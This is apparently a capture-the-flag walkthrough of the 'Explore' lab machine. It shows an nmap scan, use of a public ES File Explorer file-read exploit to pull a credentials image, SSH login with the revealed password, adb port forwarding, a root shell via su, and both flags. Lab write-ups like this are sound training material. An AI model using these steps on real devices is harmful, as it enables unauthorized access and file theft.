![Explore.PNG](/assets/Machines/Easy/Explore/Explore.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.247
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.247
```

**Output**
```bash
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
33245/tcp open     unknown
42135/tcp open     unknown
```

3. Analyze the services are running in ports discovered

```bash
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
```

4. With `searchsploit` search **Es File Explorer**
```bash
┌──(root㉿kali)-[/home/kali]
└─| searchsploit 'es file explorer'
```

**Output**
```bash
--------------------------------------------------------------------------------- -------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- -------------------------
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                                 | android/remote/50070.py

```

5. Copy the exploit in **current directory**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Explore]
└─| searchsploit -m android/remote/50070.py
```

6. Dowload file `creds.jpg`
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Explore]
└─| python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
```

7. Open image

![creds.PNG](/assets/Machines/Easy/Explore/creds.PNG)


8. Login with ssh 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Explore]
└─| sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh kristi@10.10.10.247 -p 2222
```

9. Cat **user flag**
```bash
:/sdcard $ cat user.txt                                                        
f32017174c7c7e8f50c6da52891ae250
```

10. Look ports open in device

```bash
:/sdcard $ netstat -nat
Active Internet connections (established and servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      1 10.10.10.247:52016      1.0.0.1:853             SYN_SENT   
tcp        0      1 10.10.10.247:57502      1.1.1.1:853             SYN_SENT   
tcp6       0      0 :::2222                 :::*                    LISTEN     
tcp6       0      0 ::ffff:10.10.10.2:45905 :::*                    LISTEN     
tcp6       0      0 :::5555                 :::*                    LISTEN     
tcp6       0      0 :::42135                :::*                    LISTEN     
tcp6       0      0 :::59777                :::*                    LISTEN     
tcp6       0      0 ::ffff:127.0.0.1:44549  :::*                    LISTEN     
tcp6       0     80 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.1:51540 ESTABLISHED
```

* Adb (Android Debug Bridge) allows communication with an instance of an emulator.

11. Do Port Forwarding **Port: 5555** for our port 5555 be port 5555 the target machine

```bash
┌──(root㉿kali)-[/home/kali]
└─| sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555
```

---


* Now our port 5555 is open and running the service of port 5555 target's machine
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Explore]
└─| lsof -i:5555
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     30484 root    4u  IPv6  85071      0t0  TCP localhost:5555 (LISTEN)
ssh     30484 root    5u  IPv4  85072      0t0  TCP localhost:5555 (LISTEN)
```


12. Spawn a shell and login how root without password

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Explore]
└─| adb -s localhost:5555 shell
```

**Output**
```bash
x86_64:/ $ 
```

---
```bash
x86_64:/$su                                                                                         
:/ # whomai
root
```

13. Cat a **root flag**

```bash
:/ # cd data
:/data # cat root.txt                                                          
f04fc82b6d49b41c9b08982be59338c5
```